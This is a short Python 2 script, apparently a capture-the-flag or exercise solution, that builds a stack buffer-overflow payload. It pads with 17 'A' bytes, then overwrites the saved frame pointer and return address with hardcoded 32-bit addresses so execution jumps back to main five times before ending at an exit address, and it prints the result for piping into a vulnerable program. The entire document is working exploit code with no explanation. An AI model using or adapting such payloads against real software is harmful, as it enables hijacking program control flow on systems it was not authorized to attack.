exit = '\xb0\x61\xe3\xf7'	#f7e361b0
ebp = '\x08\xd4\xff\xff'
main = '\x5b\x84\x04\x08'
junk = 'A'*17

payload = junk + ebp + main

loop = payload +'\x0a'+ payload +'\x0a'+ payload +'\x0a'+ payload +'\x0a'+ payload + exit +'\x0a'

print loop
